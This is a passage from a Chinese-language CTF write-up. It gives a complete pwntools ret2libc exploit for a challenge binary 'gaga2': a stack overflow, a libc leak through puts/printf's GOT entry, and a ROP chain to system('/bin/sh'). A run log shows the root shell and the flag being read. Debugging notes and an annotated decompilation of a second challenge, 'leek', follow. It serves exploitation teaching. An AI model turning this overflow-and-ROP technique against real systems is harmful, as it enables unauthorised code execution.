
```python
from pwn import *
import warnings
warnings.filterwarnings(action='ignore', category=BytesWarning)
s = lambda data :p.send(data)
sa = lambda delim,data :p.sendafter(delim, data)
sl = lambda data :p.sendline(data)
sla = lambda delim,data :p.sendlineafter(delim, data)
r = lambda num=4096 :p.recv(num)
ru = lambda delims, drop=True :p.recvuntil(delims, drop)
ruf = lambda delims, drop=False :p.recvuntil(delims, drop)
rl = lambda drop=True :p.recvline(drop)
rlf = lambda drop=False :p.recvline(drop)
uu64 = lambda data :u64(data.ljust(8,'\x00'))
leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
logsucc = lambda info :log.success(info)
itr = lambda :p.interactive()
context.clear(arch='amd64') # 【注意1】加上架构信息，不然rop模块会把该程序当成32位程序
context.log_level = 'DEBUG'
#context.terminal=['tmux', 'spilit-window', '-h']
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
elf = ELF("./gaga2")
p = process("./gaga2")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# step1: leak libc base addr
# logsucc(hex(elf.got["printf"]))
rop = ROP(elf) # 创建一个 rop 对象，这时 rop 链还是空的，需要在其中添加函数
rop.puts(elf.got["printf"]) # 等价于 rop.call('puts', (elf.got["printf"],))
rop.main() # 回到main函数，那就可以再输入一次了
print(rop.dump())
payload = b'a'*0x48 + rop.chain() # rop.chain() : 返回当前的字节序列，即 payload
sla("Your input: ", payload)
printf_addr = u64(rlf().ljust(8, b"\x00")) # 接收puts打印出的printf函数
leak("printf addr", printf_addr)
libc_addr = printf_addr - libc.symbols["printf"]
libc.address = libc_addr # 将计算结果赋值给libc对象的address，这样后面算/bin/sh的地址的时候就不用再加基址了
leak("libc addr", libc.address)
# step2: rop，将main函数的ret覆盖成system("/bin/sh")
rop2 = ROP(libc)
# find_gadget(instructions): Returns a gadget with the exact sequence of instructions specified in the instructions argument.
# raw(value): Adds a raw integer or string to the ROP chain. If your architecture requires aligned values, then make sure that any given string is aligned!
rop2.raw(rop2.find_gadget(["ret"])) # 【注意2】ubuntu18开始，执行system函数需要栈对齐（16字节对齐），我先试了不加这条指令，是没有对齐的，所以这里加一条ret指令，令栈对齐
rop2.system(next(libc.search(b"/bin/sh")))
print(rop2.dump())
payload2 = b'a'*0x48 + rop2.chain()
sla("Your input: ", payload2)
itr()
```

结果如下：

```shell
root@e289eaa0da06:/chal# python3 exp2.py
[*] '/chal/gaga2'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
[+] Starting local process './gaga2' argv=[b'./gaga2'] : pid 394
[*] '/lib/x86_64-linux-gnu/libc.so.6'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
[*] Loaded 14 cached gadgets for './gaga2'
0x0000: 0x4012b3 pop rdi; ret
0x0008: 0x404030 [arg0] rdi = got.printf
0x0010: 0x401094 puts
0x0018: 0x4011d6 main()
[DEBUG] Received 0x44 bytes:
b"Awesome! Now there's no system(), so what will you do?!\n"
b'Your input: '
[DEBUG] Sent 0x69 bytes:
00000000 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 │aaaa│aaaa│aaaa│aaaa│
*
00000040 61 61 61 61 61 61 61 61 b3 12 40 00 00 00 00 00 │aaaa│aaaa│··@·│····│
00000050 30 40 40 00 00 00 00 00 94 10 40 00 00 00 00 00 │0@@·│····│··@·│····│
00000060 d6 11 40 00 00 00 00 00 0a │··@·│····│·│
00000069
[DEBUG] Received 0x4b bytes:
00000000 70 e7 e7 9e 19 7f 0a 41 77 65 73 6f 6d 65 21 20 │p···│···A│weso│me! │
00000010 4e 6f 77 20 74 68 65 72 65 27 73 20 6e 6f 20 73 │Now │ther│e's │no s│
00000020 79 73 74 65 6d 28 29 2c 20 73 6f 20 77 68 61 74 │yste│m(),│ so │what│
00000030 20 77 69 6c 6c 20 79 6f 75 20 64 6f 3f 21 0a 59 │ wil│l yo│u do│?!·Y│
00000040 6f 75 72 20 69 6e 70 75 74 3a 20 │our │inpu│t: │
0000004b
[+] printf addr = 0x7f199ee7e770
[+] libc addr = 0x7f199ee1e000
[*] Loaded 218 cached gadgets for '/lib/x86_64-linux-gnu/libc.so.6'
0x0000: 0x7f199ee47cd6 ret
0x0008: 0x7f199ee483e5 pop rdi; ret
0x0010: 0x7f199eff6698 [arg0] rdi = 139748018448024
0x0018: 0x7f199ee6ed60 system
[DEBUG] Sent 0x69 bytes:
00000000 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 │aaaa│aaaa│aaaa│aaaa│
*
00000040 61 61 61 61 61 61 61 61 d6 7c e4 9e 19 7f 00 00 │aaaa│aaaa│·|··│····│
00000050 e5 83 e4 9e 19 7f 00 00 98 66 ff 9e 19 7f 00 00 │····│····│·f··│····│
00000060 60 ed e6 9e 19 7f 00 00 0a │`···│····│·│
00000069
[*] Switching to interactive mode
$ id
[DEBUG] Sent 0x3 bytes:
b'id\n'
[DEBUG] Received 0x27 bytes:
b'uid=0(root) gid=0(root) groups=0(root)\n'
uid=0(root) gid=0(root) groups=0(root)
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
b'cat flag.txt\n'
[DEBUG] Received 0x11 bytes:
b'flag{aaaaaaaaaa}\n'
flag{aaaaaaaaaa}
$
```

## 2.3 调试

以前都是在虚拟机里做题，如果调试，直接`gdb.attach(p)`就ok了。现在在docker里调试，步骤如下：

1. 进入tmux
2. python脚本：`context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']`
3. python脚本：`gdb.attach(p)`
4. 执行python脚本

> `pwnlib.gdb.attach(target, gdbscript='', exe=None, gdb_args=None, ssh=None, sysroot=None, api=False)`
>
> [`pwnlib.gdb.attach` - API介绍](elink@553K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2M7s2N6F1N6r3!0G2L8s2y4Q4x3X3g2U0L8$3#2Q4x3V1k6W2L8W2)9J5c8Y4y4@1j5h3u0D9k6g2)9J5c8X3N6V1j5W2)9J5k6h3S2@1L8h3I4Q4x3U0y4H3N6$3&6D9K9h3u0Q4x3X3g2Y4k6r3u0Q4x3X3g2S2N6s2c8S2j5$3R3`.)

计算栈中变量距离`ret`可用两个API：`cyclic(num)`和`cyclic_find(string)`。

最终还是调了一下`gaga0`：

```python
sla("Your input: ", cyclic(0x100))
```

![](upload/attach/202402/830671_NHBVNAKGB2864SN.jpg)

可以看到`main`函数的返回地址被覆盖成了`0x6161617461616173`，对应的字符是：`saaataaa`。

```python
offset = cyclic_find("saaa")
logsucc(hex(offset))
```

打印结果看到是`0x48`

```shell
root@870aeb6e392e:/chal# python3 exp0.py
......
[+] 0x48
......
```

# 3 leek

Dockerfile如下：

```dockerfile
FROM pwn.red/jail
COPY --from=ubuntu:22.04 / /srv
COPY leek /srv/app/run
COPY flag.txt /srv/app/flag.txt
RUN chmod 755 /srv/app/run
```

该程序运行在Ubuntu22环境中，同时又有`flag.txt`。

## 3.1 运行

```shell
root@3d0b9610b107:/chal# ./leek
I dare you to leek my secret.
Your input (NO STACK BUFFER OVERFLOWS!!): hello
:skull::skull::skull: bro really said: hello
So? What's my secret? aaa
Wrong!
root@3d0b9610b107:/chal# checksec leek
[*] '/chal/leek'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: Canary found
NX: NX enabled
PIE: No PIE (0x400000)
```

开启了Canary和NX，PIE是关闭的。

## 3.2 反编译

简单扫几眼`main`函数，最后调用`win`函数，点进去一看，功能是打印flag:)。所以大概就是让想办法使程序能走到最后。首先找前面有没有程序结束点，其他看注释吧。

- `main`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
unsigned int v3; // eax
int i; // [rsp+0h] [rbp-50h]
int j; // [rsp+4h] [rbp-4Ch]
__gid_t rgid; // [rsp+8h] [rbp-48h]
char *v9; // [rsp+10h] [rbp-40h]
void *s; // [rsp+18h] [rbp-38h]
char s2[40]; // [rsp+20h] [rbp-30h] BYREF
unsigned __int64 v12; // [rsp+48h] [rbp-8h]
v12 = __readfsqword(0x28u);
v3 = time(0LL);
srand(v3);
setbuf(stdout, 0LL);
setbuf(stdin, 0LL);
rgid = getegid();
setresgid(rgid, rgid, rgid);
puts("I dare you to leek my secret.");
for ( i = 0; i < N; ++i ) // 【12】循环100次
{
v9 = (char *)malloc(0x10uLL);
s = malloc(0x20uLL); // 【4】s是分配的堆块
memset(s, 0, 0x20uLL);
getrandom(s, 32LL, 0LL); // 【5】s填充为随机数
for ( j = 0; j <= 31; ++j )
{
if ( !*((_BYTE *)s + j) || *((_BYTE *)s + j) == 10 )// 【6】如果s中有NULL或者回车符，则将其替换为数字1
*((_BYTE *)s + j) = 1;
}
printf("Your input (NO STACK BUFFER OVERFLOWS!!): ");
input(v9); // 【7】v9是内容大小为0x10的chunk，然后传入input函数存储输入
printf(":skull::skull::skull: bro really said: ");
puts(v9); // 【10】打印v9
printf("So? What's my secret? ");
fgets(s2, 33, stdin); // 【3】s2是输入（0x21 Byte）
if ( strncmp((const char *)s, s2, 0x20uLL) )// 【2】要让s和s2的前0x20字节相等
{
puts("Wrong!"); // 【1】不能让程序走到这里
exit(-1);
}
puts("Okay, I'll give you a reward for guessing it.");
printf("Say what you want: ");
gets(v9); // 【11】再次往v9输入，也可以溢出
puts("Hmm... I changed my mind.");
free(s);
free(v9);
puts("Next round!");
}
puts("Looks like you made it through.");
win();
return v12 - __readfsqword(0x28u);
}
```

- `input`
